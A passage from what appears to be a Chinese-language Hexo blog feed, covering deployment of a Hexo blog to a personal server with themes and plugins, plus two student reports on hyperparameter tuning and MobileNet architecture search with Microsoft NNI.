<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ssh root@&quot;your_ip&quot;</span><br></pre></td></tr></table></figure>
<p>之后创建<code>/var/repo</code>文件夹，在里面新建一个叫blog的git仓库，新建命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git init --bare blog.git</span><br></pre></td></tr></table></figure>
<p>之后，打开<code>blog.git/hooks/post-receive</code>，<code>chmod</code>一下，同时添加下列内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">git --work-tree&#x3D;&#x2F;var&#x2F;www&#x2F;hexo --git-dir&#x3D;&#x2F;var&#x2F;repo&#x2F;blog.git checkout -f</span><br></pre></td></tr></table></figure>
<p>之后，在<code>var/www/hexo</code>处创建好文件夹，<code>chmod</code>一下，这样之后，服务器端的设置就完成了。</p>
<p>最终我们想要的是：在本机输入<code>hexo d</code>时，能部署到服务器上，这时需要在根目录下的<code>_config.yml</code>下修改：</p>
<h3 id="第一处"><a href="#第一处" class="headerlink" title="第一处"></a>第一处</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># URL</span><br><span class="line">## If your site is put in a subdirectory, set url as &#39;http:&#x2F;&#x2F;example.com&#x2F;child&#39; and root as &#39;&#x2F;child&#x2F;&#39;</span><br><span class="line">url: https:&#x2F;&#x2F;your_ip</span><br></pre></td></tr></table></figure>
<h3 id="第二处"><a href="#第二处" class="headerlink" title="第二处"></a>第二处</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  - type: git</span><br><span class="line">    repo: git@github.com:Garen-Wang&#x2F;garen-wang.github.io.git</span><br><span class="line">    branch: master</span><br><span class="line">  - type: git</span><br><span class="line">    repo: root@your_ip:&#x2F;var&#x2F;repo&#x2F;blog.git</span><br><span class="line">    branch: master</span><br></pre></td></tr></table></figure>
<p>这样就应该能把hexo部署到你的服务器上面去了。</p>
<h2 id="添加备案号"><a href="#添加备案号" class="headerlink" title="添加备案号"></a>添加备案号</h2><p>网站还是得加备案号的，不过这里不用改模板，直接在NexT主题的<code>_config.yml</code>中修改：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">footer:</span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">  # Beian ICP and gongan information for Chinese users. See: http:&#x2F;&#x2F;www.beian.miit.gov.cn, http:&#x2F;&#x2F;www.beian.gov.cn</span><br><span class="line">  beian:</span><br><span class="line">    enable: true</span><br><span class="line">    icp: 粤ICP备2021003110号</span><br><span class="line">    # The digit in the num of gongan beian.</span><br><span class="line">    gongan_id:</span><br><span class="line">    # The full num of gongan beian.</span><br><span class="line">    gongan_num: 2021003110</span><br><span class="line">    # The icon for gongan beian. See: http:&#x2F;&#x2F;www.beian.gov.cn&#x2F;portal&#x2F;download</span><br><span class="line">    gongan_icon_url: images&#x2F;beian.png</span><br></pre></td></tr></table></figure>
<p>在主题文件夹中的<code>source</code>中新建个<code>images</code>文件夹，可以把<a href="http://www.beian.gov.cn/portal/download">这张图片</a>下载到里面去，就可以用相对路径引用了。btw，对头像的设置也是同理。</p>
<h2 id="mathjax支持"><a href="#mathjax支持" class="headerlink" title="mathjax支持"></a>mathjax支持</h2><p>这个东西曾经困扰了我很久，其实只要按下面的顺序，NexT主题也能用上mathjax。</p>
<p>先更换Hexo的Markdown渲染引擎：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure>
<p>需要在<code>node_modules/kramed/lib/rules/inline.js</code>中修改两处（分别是原第11行和第20行）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;escape: &#x2F;^\\([\\&#96;*&#123;&#125;\[\]()#$+\-.!_&gt;])&#x2F;,</span><br><span class="line">escape: &#x2F;^\\([&#96;*\[\]()#$+\-.!_&gt;])&#x2F;,</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;em: &#x2F;^\b_((?:__|[\s\S])+?)_\b|^\*((?:\*\*|[\s\S])+?)\*(?!\*)&#x2F;,</span><br><span class="line">em: &#x2F;^\*((?:\*\*|[\s\S])+?)\*(?!\*)&#x2F;,</span><br></pre></td></tr></table></figure>
<p>最后在每个需要启用mathjax的博客页面里，在一开始的Front-matter那里加上一句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mathjax: true</span><br></pre></td></tr></table></figure>
<p>这样就可以用上LaTeX语法写行内公式和行间公式了。</p>
<img data-src="http://qiniu.garen-wang.top/static/images/My-Hexo-Blog-Configuration/2021-01-08_23-29.png">
<h2 id="搜索框"><a href="#搜索框" class="headerlink" title="搜索框"></a>搜索框</h2><p>搜索框也很容易实现。</p>
<p>先用npm安装下插件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install --save hexo-generator-search</span><br><span class="line">$ npm install --save hexo-generator-searchdb</span><br></pre></td></tr></table></figure>
<p>在NexT主题文件夹下的<code>_config.yml</code>下修改：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local_search:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure>
<p>重新部署一下之后，就可以看到出现了搜索框。</p>
<h2 id="评论系统支持"><a href="#评论系统支持" class="headerlink" title="评论系统支持"></a>评论系统支持</h2><p>评论系统中，NexT主题的配置中自带对Valine的支持，我们干脆直接用它咯！</p>
<h3 id="Valine的使用"><a href="#Valine的使用" class="headerlink" title="Valine的使用"></a>Valine的使用</h3><ol>
<li>在LeanCloud注册</li>
<li>创建应用，名称随意</li>
<li>进入“设置-应用Keys”，获取App ID和AppKey</li>
<li>在主题文件夹中的<code>_config.yml</code>修改Valine对应内容为：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">valine:</span><br><span class="line">  enable: true</span><br><span class="line">  appid: Your leancloud application appid</span><br><span class="line">  appkey: Your leancloud application appkey</span><br><span class="line">  notify: true # Mail notifier</span><br><span class="line">  verify: false # Verification code</span><br><span class="line">  placeholder: Just go go # Comment box placeholder</span><br><span class="line">  avatar: mm # Gravatar style</span><br><span class="line">  guest_info: nick,mail,link # Custom comment header</span><br><span class="line">  pageSize: 10 # Pagination size</span><br><span class="line">  language: zh-cn # Language, available values: en, zh-cn</span><br><span class="line">  visitor: true # Article reading statistic</span><br><span class="line">  comment_count: true # If false, comment count will only be displayed in post page, not in home page</span><br><span class="line">  recordIP: false # Whether to record the commenter IP</span><br><span class="line">  serverURLs: # When the custom domain name is enabled, fill it in here (it will be detected automatically by default, no need to fill in)</span><br><span class="line">  #post_meta_order: 0</span><br></pre></td></tr></table></figure>
<p>然后在储存-结构化数据中创建两个新的Class，名称分别为<code>Comment</code>和<code>Counter</code>，分别可以用来存评论和链接访问数，非常方便。</p>
<p>在LeanCloud后台看到的数据就是这样的：</p>
<img data-src="http://qiniu.garen-wang.top/static/images/My-Hexo-Blog-Configuration/2021-01-08_22-44.png">
<p>之后部署一下就可以看到效果了！</p>
<img data-src="http://qiniu.garen-wang.top/static/images/My-Hexo-Blog-Configuration/2021-01-08_22-42.png">
<h2 id="七牛云图床"><a href="#七牛云图床" class="headerlink" title="七牛云图床"></a>七牛云图床</h2><p>首先先在博客根目录安装一下需要的Hexo插件：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install --save hexo-qiniu-sync</span><br></pre></td></tr></table></figure><br>在七牛云右上角的密钥管理就可以找到access key和secret key了，bucket填你自己创建时写的空间名称，在<code>_config.yml</code>里面添加这一段配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">qiniu:</span><br><span class="line">  offline: false</span><br><span class="line">  sync: true</span><br><span class="line">  bucket: &quot;your_bucket_name&quot;</span><br><span class="line">  access_key: &quot;your_access_key&quot;</span><br><span class="line">  secret_key: &quot;your_secret_key&quot;</span><br><span class="line">  dirPrefix: static</span><br><span class="line">  urlPrefix: http:&#x2F;&#x2F;&quot;your_qiniu_url&quot;&#x2F;static</span><br><span class="line">  up_host: http:&#x2F;&#x2F;upload.qiniu.com</span><br><span class="line">  local_dir: static</span><br><span class="line">  update_exist: true</span><br><span class="line">  image: </span><br><span class="line">    folder: images</span><br><span class="line">    extend: </span><br><span class="line">  js:</span><br><span class="line">    folder: js</span><br><span class="line">  css:</span><br><span class="line">    folder: css</span><br></pre></td></tr></table></figure>
<p>在文档中，就不需要使用Markdown的插入图片格式了，使用下面的格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% qnimg test.jpg %&#125;</span><br></pre></td></tr></table></figure>
<p>这样的语句会自动读取<code>static/images/test.jpg</code>这个路径下的图片。</p>
<p>在更新博客时，可以先跑一下这条命令，将<code>static/images</code>下的所有图片都上传到七牛云，这样博客的外链就能访问出图片了。</p>
<p>不过不跑似乎也没关系，在<code>hexo g</code>的时候似乎会自动帮你上传，挺贴心的。</p>
<h2 id="小彩蛋"><a href="#小彩蛋" class="headerlink" title="小彩蛋"></a>小彩蛋</h2><h3 id="我大E了啊"><a href="#我大E了啊" class="headerlink" title="我大E了啊"></a>我大E了啊</h3><p>在配置的时候有一次跑<code>hexo g -d</code>的时候报错了，怎么改都改不好，心态差点崩了，差点要把整个博客重新弄一遍。</p>
<p>这种情况的最好解决方法是一开始就用git维护整个仓库。最后我直接用<code>git reset</code>回滚到上次commit的时候，一切就又都回来了。我又继续无止境地配置下去了……</p>
<h3 id="什么？DDL？"><a href="#什么？DDL？" class="headerlink" title="什么？DDL？"></a>什么？DDL？</h3><p>啊？什么？我今天没赶DDL？</p>
<img data-src="http://qiniu.garen-wang.top/static/images/My-Hexo-Blog-Configuration/WeChat_Image_20210108221702.jpg">
<p>其实明天是数创大作业的deadline。。。</p>
<p>放心，明天弄得完的。deadline是第一生产力。。。</p>
<p>熬夜继续爆肝大作业，还不如早点休息。。。</p>
<img data-src="http://qiniu.garen-wang.top/static/images/My-Hexo-Blog-Configuration/84869490_p0.jpg">
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.csdn.net/as480133937/article/details/100138838">https://blog.csdn.net/as480133937/article/details/100138838</a></p>
<p><a href="https://blog.csdn.net/yexiaohhjk/article/details/82526604">https://blog.csdn.net/yexiaohhjk/article/details/82526604</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/34747279">https://zhuanlan.zhihu.com/p/34747279</a></p>
<p><a href="https://www.jianshu.com/p/70bf58c48010">https://www.jianshu.com/p/70bf58c48010</a></p>
]]></content>
      <tags>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title>NNI Student Program 2020 Task1</title>
    <url>/2021/01/08/NNI-Student-Program-2020-Task1/</url>
    <content><![CDATA[<h1 id="Task-1-入门任务"><a href="#Task-1-入门任务" class="headerlink" title="Task 1 入门任务"></a>Task 1 入门任务</h1><h2 id="NNI-体验文档"><a href="#NNI-体验文档" class="headerlink" title="NNI 体验文档"></a>NNI 体验文档</h2><h3 id="1-AutoML-工具比较"><a href="#1-AutoML-工具比较" class="headerlink" title="1. AutoML 工具比较"></a>1. AutoML 工具比较</h3><p>机器学习算法与模型的选择，对机器学习十分重要，一个成功的选择，能够成倍提高训练效率，从而提高模型准确度，减少损失，产生更大的效益。</p>
<p>但算法与模型的选择并不简单。就算是数据科学家，也需要花费大量的时间用于尝试与权衡不同模型的优劣，最终才能得出理想的结果。超参的调参过程中也经常造成算力的浪费。</p>
<p>自动机器学习（AutoML）是一套自动化的机器学习应用工具，旨在用自动化工具完成特征工程、自动调参等优化工作。</p>
<p>当前，自动机器学习平台早已问世，下面介绍几个著名的AutoML工具，并列出优缺点，以供比较。</p>
<a id="more"></a>
<h4 id="auto-sklearn"><a href="#auto-sklearn" class="headerlink" title="auto-sklearn"></a>auto-sklearn</h4><p>auto-sklearn是GitHub上开源的一个基于sklearn的自动机器学习工具，目前已获得5.1k个星。</p>
<p>优点：可限制训练时间，支持切分训练集和测试集，支持交叉验证。</p>
<p>缺点：输出信息较少，优化算法单一。</p>
<h4 id="Google-Cloud-AutoML"><a href="#Google-Cloud-AutoML" class="headerlink" title="Google Cloud AutoML"></a>Google Cloud AutoML</h4><p>Google Cloud AutoML基于高精度的深度神经网络而设计，可用于图像分类、自然语言处理、语音翻译等。</p>
<p>优点：具有较完整的谷歌ML生态链，Tensorflow+Colab+Cloud AutoML共同使用时非常方便。</p>
<p>优点：具有完整图形界面，对新手用户友好，同时提供API调用，分类详尽。</p>
<p>缺点：完整版需付费，访问需科学上网。</p>
<h4 id="Microsoft-NNI"><a href="#Microsoft-NNI" class="headerlink" title="Microsoft NNI"></a>Microsoft NNI</h4><p>NNI(Neural Network Intelligence)是微软亚洲研究院开源的自动机器学习工具，面向研究人员和算法工程师而设计，2018年9月问世，目前已经更新至v1.9。</p>
<p>优点：具有多平台支持，可命令行操作，支持结果可视化。内置优化算法多，扩展性强，支持远程调用进行集群训练。</p>
<p>缺点：暂未发现</p>
<p>更详细的对比：</p>
<p><img data-src="https://www.msra.cn/wp-content/uploads/2019/12/nni-2.png" alt></p>
<p>（摘自MSRA官网）</p>
<h3 id="2-NNI-安装及使用"><a href="#2-NNI-安装及使用" class="headerlink" title="2. NNI 安装及使用"></a>2. NNI 安装及使用</h3><p>NNI的安装非常简单，只需一行命令即可安装：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ pip install --upgrade nni</span><br></pre></td></tr></table></figure>
<p>本人强烈推荐将nni安装在Anaconda的环境中，可通过在PyCharm中设置Python解释器，实现对NNI的调用。</p>
<p>使用NNI，需要在原有神经网络代码的基础上做出些许修改：</p>
<ol>
<li>通过nni模块获得参数</li>
<li>向nni报告中间结果</li>
<li>向nni报告最终结果</li>
</ol>
<p>修改好代码并且准备好搜索空间和配置文件后，就可以通过一行命令开始使用NNI：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nnictl create --config your-config.yml</span><br></pre></td></tr></table></figure>
<p>具体会在下述代码部分进行解释。</p>
<h3 id="3-NNI-使用感受"><a href="#3-NNI-使用感受" class="headerlink" title="3. NNI 使用感受"></a>3. NNI 使用感受</h3><p>NNI易于安装，易于使用，有一套完善的命令行控制工具，也有结果可视化界面，对机器学习实验与研究提供了巨大的便利。</p>
<p>本人大一，尚未接触过多机器学习知识，但通过在本地跑通多个样例后，能感受到NNI在机器学习方面的威力，希望未来能够掌握NNI，方便未来的研究与学习。</p>
<h2 id="NNI-样例分析文档"><a href="#NNI-样例分析文档" class="headerlink" title="NNI 样例分析文档"></a>NNI 样例分析文档</h2><h3 id="配置文件：config-windows-yml"><a href="#配置文件：config-windows-yml" class="headerlink" title="配置文件：config_windows.yml"></a>配置文件：config_windows.yml</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">authorName: default</span><br><span class="line">experimentName: example_mnist_pytorch</span><br><span class="line">trialConcurrency: 1</span><br><span class="line">maxExecDuration: 2h</span><br><span class="line">maxTrialNum: 10</span><br><span class="line">#choice: local, remote, pai</span><br><span class="line">trainingServicePlatform: local</span><br><span class="line">searchSpacePath: search_space.json</span><br><span class="line">#choice: true, false</span><br><span class="line">useAnnotation: false</span><br><span class="line">tuner:</span><br><span class="line">  #choice: TPE, Random, Anneal, Evolution, BatchTuner, MetisTuner, GPTuner</span><br><span class="line">  #SMAC (SMAC should be installed through nnictl)</span><br><span class="line">  builtinTunerName: TPE</span><br><span class="line">  classArgs:</span><br><span class="line">    #choice: maximize, minimize</span><br><span class="line">    optimize_mode: maximize</span><br><span class="line">trial:</span><br><span class="line">  command: python mnist.py</span><br><span class="line">  codeDir: .</span><br><span class="line">  gpuNum: 0</span><br></pre></td></tr></table></figure>
<h3 id="搜索空间：search-space-json"><a href="#搜索空间：search-space-json" class="headerlink" title="搜索空间：search_space.json"></a>搜索空间：search_space.json</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;batch_size&quot;</span>: &#123;<span class="attr">&quot;_type&quot;</span>:<span class="string">&quot;choice&quot;</span>, <span class="attr">&quot;_value&quot;</span>: [<span class="number">16</span>, <span class="number">32</span>, <span class="number">64</span>, <span class="number">128</span>]&#125;,</span><br><span class="line">    <span class="attr">&quot;hidden_size&quot;</span>:&#123;<span class="attr">&quot;_type&quot;</span>:<span class="string">&quot;choice&quot;</span>,<span class="attr">&quot;_value&quot;</span>:[<span class="number">128</span>, <span class="number">256</span>, <span class="number">512</span>, <span class="number">1024</span>]&#125;,</span><br><span class="line">    <span class="attr">&quot;lr&quot;</span>:&#123;<span class="attr">&quot;_type&quot;</span>:<span class="string">&quot;choice&quot;</span>,<span class="attr">&quot;_value&quot;</span>:[<span class="number">0.0001</span>, <span class="number">0.001</span>, <span class="number">0.01</span>, <span class="number">0.1</span>]&#125;,</span><br><span class="line">    <span class="attr">&quot;momentum&quot;</span>:&#123;<span class="attr">&quot;_type&quot;</span>:<span class="string">&quot;uniform&quot;</span>,<span class="attr">&quot;_value&quot;</span>:[<span class="number">0</span>, <span class="number">1</span>]&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>代码部分只需要在原有PyTorch代码上进行些许修改。</p>
<ol>
<li>参数选择无需在程序中给定，而是通过nni获得：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tuner_params = nni.get_next_parameter()</span><br></pre></td></tr></table></figure></li>
<li>在每个epoch学习完成后，报告中间结果：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nni.report_intermediate_result(test_acc)</span><br></pre></td></tr></table></figure></li>
<li>在训练完整结束后，报告最终结果：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nni.report_final_result(test_acc)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><p>如图，10次trial都成功地完成，其中id为9的trial达到了最高准确率，达99.34%。</p>
<img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task1/1.png">

<img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task1/4.png">

<h4 id="超参组合可视化"><a href="#超参组合可视化" class="headerlink" title="超参组合可视化"></a>超参组合可视化</h4><img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task1/5.png">

<p>图中，准确率更高的组合用红线表示，而准确率低的用绿线表示。</p>
<p>可以看出，当batch_size选择16，lr和momentum大小适中时，模型可以达到99%以上的准确率，实验效果非常理想。</p>
<h4 id="训练结果可视化"><a href="#训练结果可视化" class="headerlink" title="训练结果可视化"></a>训练结果可视化</h4><img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task1/3.png">

<p>Default Metric</p>
<img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task1/2.png">

<p>Sorted Default Metric</p>
<img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task1/6.png">

<p>Trial Duration</p>
<img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task1/7.png">

<p>Intermediate Results</p>
<hr>
<p>Jan 23rd upd: 楼下的评论说的有道理，把评论搬上来……</p>
<p>在跑NNI的时候，有时经常遇见任何一个trial跑几秒就失败的情况。</p>
<p>顺着实验文件夹里面的<code>stderr</code>去看，原来报错是这个：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Error: mkl-service + Intel(R) MKL: MKL_THREADING_LAYER&#x3D;INTEL is incompatible with libgomp.so.1 library.</span><br><span class="line">    Try to import numpy first or set the threading layer accordingly. Set MKL_SERVICE_FORCE_INTEL to force it.</span><br></pre></td></tr></table></figure>
<p>解决方法是按它所说的：在终端中设置下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">export</span> MKL_SERVICE_FORCE_INTEL=1</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>NNI</tag>
      </tags>
  </entry>
  <entry>
    <title>NNI Student Program 2020 Task2.2</title>
    <url>/2021/03/11/NNI-Student-Program-2020-Task2.2/</url>
    <content><![CDATA[<h1 id="Task2-2-实验报告"><a href="#Task2-2-实验报告" class="headerlink" title="Task2.2 实验报告"></a>Task2.2 实验报告</h1><h2 id="超参调优"><a href="#超参调优" class="headerlink" title="超参调优"></a>超参调优</h2><p>NNI支持通过配置搜索空间自定义搜索结构，不仅能够运用SOTA的高效率算法进行自动超参调优，更能够在多个模型与超参中选择出性能更优的组合，从而提高模型准确率。</p>
<p>搜索空间配置文件如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;lr&quot;</span>:&#123;<span class="attr">&quot;_type&quot;</span>:<span class="string">&quot;choice&quot;</span>, <span class="attr">&quot;_value&quot;</span>:[<span class="number">0.01</span>, <span class="number">0.001</span>]&#125;,</span><br><span class="line">    <span class="attr">&quot;optimizer&quot;</span>:&#123;<span class="attr">&quot;_type&quot;</span>:<span class="string">&quot;choice&quot;</span>, <span class="attr">&quot;_value&quot;</span>:[<span class="string">&quot;Adadelta&quot;</span>, <span class="string">&quot;Adagrad&quot;</span>, <span class="string">&quot;Adam&quot;</span>, <span class="string">&quot;Adamax&quot;</span>]&#125;,</span><br><span class="line">    <span class="attr">&quot;model&quot;</span>:&#123;<span class="attr">&quot;_type&quot;</span>:<span class="string">&quot;choice&quot;</span>, <span class="attr">&quot;_value&quot;</span>:[<span class="string">&quot;vgg&quot;</span>, <span class="string">&quot;resnet18&quot;</span>, <span class="string">&quot;googlenet&quot;</span>, <span class="string">&quot;densenet121&quot;</span>, <span class="string">&quot;mobilenet&quot;</span>, <span class="string">&quot;dpn92&quot;</span>, <span class="string">&quot;shufflenetg2&quot;</span>,<span class="string">&quot;senet18&quot;</span>]&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在代码中，当前trial的超参组合可从<code>nni.get_next_parameter()</code>获得，并以dict的形式保存。</p>
<a id="more"></a>
<h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><p>由于设备性能有限，在进行NNI的HPO实验时每个trial的epoch数并没能设定得足够多，这极有可能会导致最终的实验结果与retrain的性能不相符。我们训练了HPO实验中metric最优的超参组合，后续效果却不尽人意。反而是在非最优的超参组合中，我们训练出了较好的效果。</p>
<p>最终我们选定了学习率为0.01，优化器为Adamax，神经网络模型为mobilenet的组合，并在重训练了200个epoch后取得了96.66%的准确率。</p>
<h2 id="Classic-NAS"><a href="#Classic-NAS" class="headerlink" title="Classic NAS"></a>Classic NAS</h2><p>通过上一步得到的模型与参数的组合，我们尝试在搜索空间上定义随机结构，测试模型的性能。</p>
<p>神经网络的随机结构可以借助NNI的经典NAS算法来实现，随机架构的搜索tuner可以在NNI的example中找到。</p>
<p>编写随机结构的搜索空间时，可以使用<code>nni.nas.pytorch.mutables</code>中的<code>LayerChoice</code>和<code>Inputchoice</code>来进行实现。</p>
<p>这两种定义待选连接的方式都很方便。<code>LayerChoice</code>在代码使用上可视作与其他普通神经网络等同，而要实现<code>InputChoice</code>所代表的跳过连接，则与<code>InputChoice</code>的输出进行concat操作即可。</p>
<p>这里定义了MobileNet的随机结构，代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Block</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, in_channels, out_channels, stride</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(Block, self).__init__()</span><br><span class="line">        self.in_channels = in_channels</span><br><span class="line">        self.out_channels = out_channels</span><br><span class="line">        self.conv1 = nn.Conv2d(in_channels, in_channels, <span class="number">3</span>, stride, <span class="number">1</span>, bias=<span class="literal">False</span>, groups=in_channels)</span><br><span class="line">        self.bn1 = nn.BatchNorm2d(in_channels)</span><br><span class="line">        self.conv2 = nn.Conv2d(in_channels, out_channels, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, bias=<span class="literal">False</span>)</span><br><span class="line">        self.bn2 = nn.BatchNorm2d(out_channels)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        x = F.relu(self.bn1(self.conv1(x)))</span><br><span class="line">        x = F.relu(self.bn2(self.conv2(x)))</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_make_mobilenet_layers</span>(<span class="params">in_channels</span>):</span></span><br><span class="line">    cfg = [<span class="number">64</span>, (<span class="number">128</span>, <span class="number">2</span>), <span class="number">128</span>, <span class="number">128</span>, (<span class="number">256</span>, <span class="number">2</span>), <span class="number">256</span>, <span class="number">256</span>, (<span class="number">512</span>, <span class="number">2</span>), <span class="number">512</span>, <span class="number">512</span>, <span class="number">512</span>, <span class="number">512</span>, <span class="number">512</span>, <span class="number">512</span>, (<span class="number">1024</span>, <span class="number">2</span>), <span class="number">1024</span>, <span class="number">1024</span>]</span><br><span class="line">    layers = nn.ModuleList()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cfg:</span><br><span class="line">        out_channels = x <span class="keyword">if</span> <span class="built_in">isinstance</span>(x, <span class="built_in">int</span>) <span class="keyword">else</span> x[<span class="number">0</span>]</span><br><span class="line">        stride = <span class="number">1</span> <span class="keyword">if</span> <span class="built_in">isinstance</span>(x, <span class="built_in">int</span>) <span class="keyword">else</span> x[<span class="number">1</span>]</span><br><span class="line">        layers.append(Block(in_channels, out_channels, stride))</span><br><span class="line">        in_channels = out_channels</span><br><span class="line">    <span class="keyword">return</span> layers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MobileNet</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(MobileNet, self).__init__()</span><br><span class="line">        self.conv1 = nn.Conv2d(<span class="number">3</span>, <span class="number">32</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, bias=<span class="literal">False</span>)</span><br><span class="line">        self.bn1 = nn.BatchNorm2d(<span class="number">32</span>)</span><br><span class="line">        self.layers = _make_mobilenet_layers(<span class="number">32</span>)</span><br><span class="line">        self.pool = nn.AvgPool2d(<span class="number">2</span>)</span><br><span class="line">        self.linear = nn.Linear(<span class="number">1024</span>, <span class="number">10</span>)</span><br><span class="line">        self.skipconnect1 = InputChoice(n_candidates=<span class="number">2</span>, n_chosen=<span class="number">1</span>, key=<span class="string">&#x27;skip1&#x27;</span>)</span><br><span class="line">        self.skipconnect2 = InputChoice(n_candidates=<span class="number">2</span>, n_chosen=<span class="number">1</span>, key=<span class="string">&#x27;skip2&#x27;</span>)</span><br><span class="line">        self.skipconnect3 = InputChoice(n_candidates=<span class="number">2</span>, n_chosen=<span class="number">1</span>, key=<span class="string">&#x27;skip3&#x27;</span>)</span><br><span class="line">        self.skipconnect4 = InputChoice(n_candidates=<span class="number">2</span>, n_chosen=<span class="number">1</span>, key=<span class="string">&#x27;skip4&#x27;</span>)</span><br><span class="line">        self.skipconnect5 = InputChoice(n_candidates=<span class="number">2</span>, n_chosen=<span class="number">1</span>, key=<span class="string">&#x27;skip5&#x27;</span>)</span><br><span class="line">        self.skipconnect6 = InputChoice(n_candidates=<span class="number">2</span>, n_chosen=<span class="number">1</span>, key=<span class="string">&#x27;skip6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        x = F.relu(self.bn1(self.conv1(x)))</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        cnt = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> self.layers:</span><br><span class="line">            old_x = x</span><br><span class="line">            x = block(x)</span><br><span class="line">            <span class="keyword">if</span> block.in_channels == block.out_channels:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> i &gt;= <span class="number">2</span> <span class="keyword">and</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                zero_x = torch.zeros_like(old_x)</span><br><span class="line">                skipconnect = <span class="built_in">eval</span>(<span class="string">&#x27;self.skipconnect&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(cnt))</span><br><span class="line">                skip_x = skipconnect([zero_x, old_x])</span><br><span class="line">                x = torch.add(x, skip_x)</span><br><span class="line">                cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        x = self.pool(x)</span><br><span class="line">        x = x.view(x.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        x = self.linear(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure>
<h3 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h3><img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task2.2/capture.png">
<img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task2.2/capture2.png">
